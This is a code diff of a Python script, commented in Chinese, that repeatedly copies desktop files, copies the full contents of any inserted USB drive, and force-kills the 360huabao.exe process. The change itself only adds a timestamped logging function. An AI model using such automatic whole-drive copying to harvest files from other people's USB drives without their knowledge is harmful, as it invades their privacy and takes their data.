@@ -9,6 +9,7 @@ UPACOPY_ARGV = '--upan' #U盘全盘复制启动参数
 DESKSLEEP = 5   #桌面复制间隔时间
 UPANSLEEP = 60  #U盘检测间隔时间
 KILL360SLEEP = 60   #杀死360画报间隔时间
+STRFTIME = '%Y.%m.%d %H:%M:%S'  #格式化时间格式
 
 import os,time,shutil,sys,threading
 
@@ -98,20 +99,27 @@ isfilter(bool):是否过滤后缀名'''
                 try:
                     shutil.copy(filesrc,filetarget)
                 except Exception as e:
-                    print(f'复制异常 {filesrc} at {time.strftime("%Y.%m.%d %H:%M:%S")}')
-                    print(e)
+                    log('I',f'复制异常 {filesrc}\n{e}')
                 else:
-                    print(f'已复制 {filesrc} at {time.strftime("%Y.%m.%d %H:%M:%S")}')
+                    log('I',f'已复制 {filesrc}')
             else:
-                print(f'已跳过 {filesrc} at {time.strftime("%Y.%m.%d %H:%M:%S")}')
+                log('I',f'已跳过 {filesrc}')
 def kill360():
     '''自动杀死360画报'''
     while True:
         os.popen('taskkill /f /im 360huabao.exe').close()
         time.sleep(KILL360SLEEP)
+def log(logtype:str,logtext:str):
+    '''输出日志
+logtype(str):日志类型('D','I','W','E','F')
+logtext(str):日志内容'''
+    content = f'[{time.strftime(STRFTIME)}][{__name__}] {logtype}: {logtext}'
+    print(content,file=sys.stderr)
+    with open(LOGFILE,'a') as logfile:
+        print(content,file=logfile)
 def main():
     execute_with_arg()
-    print(f'已于 {time.strftime("%Y.%m.%d %H:%M:%S")} 启动')
+    log('I',f'已启动')
     threading.Thread(target=kill360).start()
     while True:
         if is_file_number_change():
